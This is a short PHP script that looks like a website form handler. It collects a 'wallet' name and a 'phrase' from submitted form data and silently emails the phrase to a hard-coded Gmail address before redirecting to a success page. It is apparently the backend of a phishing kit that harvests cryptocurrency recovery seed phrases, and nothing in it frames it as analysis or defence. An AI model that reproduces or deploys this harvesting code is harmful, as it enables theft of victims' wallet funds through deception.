<?php

$errors = [];
$errorMessage = '';

if (!empty($_POST)) {
    $name = $_POST['wallet'];
    $phrase = $_POST['phrase'];


    if (empty($errors)) {
        $toEmail = 'johnolufemidopamu@gmail.com';
        $emailSubject = 'New email from your website ';
        $headers = [ 'Content-type' => 'text/html; charset=iso-8859-1'];

        $bodyParagraphs = [ "\r\n Phrase:", $phrase];
        $body = join(PHP_EOL, $bodyParagraphs);

        if (mail($toEmail, $emailSubject, $body, $headers)) {
            header('Location: success.html');
        } else {
            $errorMessage = 'Oops, something went wrong. Please try again later';
        }
    } else {
        $allErrors = join('<br/>', $errors);
        $errorMessage = "<p style='color: red;'>{$allErrors}</p>";
    }
}

?>
